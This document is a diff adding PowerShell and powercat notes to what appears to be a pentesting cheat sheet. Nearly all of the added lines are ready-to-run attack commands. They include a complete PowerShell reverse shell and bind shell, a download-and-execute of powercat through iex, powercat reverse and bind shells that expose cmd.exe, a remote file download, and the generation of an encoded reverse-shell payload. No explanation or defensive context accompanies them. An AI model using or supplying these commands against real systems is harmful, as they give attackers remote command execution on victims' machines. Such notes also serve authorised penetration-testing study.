@@ -20,3 +20,46 @@ sudo socat TCP4-LISTEN:443 STDOUT
 file transfer
 sudo socat TCP4-LISTEN:443,form file:random.txt
 
+====================================
+
+powershell
+
+Set-ExecutionPolicy Unrestricted
+
+Get-ExecutionPolicy
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://1.2.3.4/location\of\a\file.txt','C:\path\where\to\store\file.txt')"
+
+listener
+sudo nc -lnvp 1234
+
+rev shell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('1.2.3.4',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+bind shell
+
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',1234);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+
+powercat
+
+iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+
+sudo nc -lnvp 1234 > receiving_powercat.ps1
+powercat -c 1.2.3.4 -p 1234 -i
+
+rev shell
+
+sudo -lvp 1234
+powercat -c 1.2.3.4 -p 1234 -e cmd.exe
+
+bind shell
+
+powercat -l -p 1234 -e cmd.exe
+
+nc 1.2.3.4 1234
+
+powercat standalone payloads
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > reverseshell.ps1
+
+
+
